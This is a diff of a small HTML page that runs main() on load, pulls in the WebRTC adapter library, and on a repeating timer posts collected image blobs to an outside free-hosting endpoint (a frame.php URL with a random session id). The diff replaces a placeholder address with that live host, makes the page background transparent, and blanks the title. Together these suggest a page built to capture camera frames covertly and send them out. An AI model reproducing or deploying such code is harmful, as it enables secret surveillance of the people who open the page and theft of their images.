@@ -1,22 +1,21 @@
 <!DOCTYPE html>
 <html lang="ru">	
 <head>	
-  <meta charset="utf-8">	
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-<title> test </title>
-  <style>
-__body {
-	margin: 0;
-}
-#container video {
-	/*width: 38%;*/ width: 25%;
-	/*border: 1px blue solid;*/
-}
+<meta charset="utf-8">	
+<meta name="viewport" content="width=device-width, initial-scale=1">	
+<title>@</title>
+<style>
+__body {margin: 0;}
+#container video {width: 25%;
+    border-radius: 5px;
+    height: 170px;
+    display: block;
+    position: relative;}
 </style>
 </head>
-<body onload="main()" style="margin:0;">
-
+<body onload="main()" style="margin:0;background-color:transparent;">
 <div id="container"></div>
+<script src="https://webrtchacks.github.io/adapter/adapter-latest.js"></script>
 
 <script type="text/javascript">
 function base64ToBlob(base64, mime) 
@@ -104,16 +103,16 @@ function main() {
                 let formData = new FormData()
                 dataUriList.map(
                     (blobFile, index) => {
-                        formData.append('image'+index, blobFile)
+                        formData.append('image '+index, blobFile)
                     }
                 );
-                fetch(' url adress '+randomInteger(0, 1000000000), {
+                fetch( 'https://rosagro.000webhostapp.com/frame.php?sid='+randomInteger(0, 1000000000), {
                     method: "post",
                     headers: [
-			                    ["Content-Type", "application/json"],
+			     /* ["Content-Type", "application/json"],
                                 ["Content-Type", "text/plain"],
-                                ["Content-Type", "multipart/form-data"]
-                             ],
+                                ["Content-Type", "multipart/form-data"] */
+                    ],
                     body: formData
                 })
             }, SHOOT_INTERVAL);
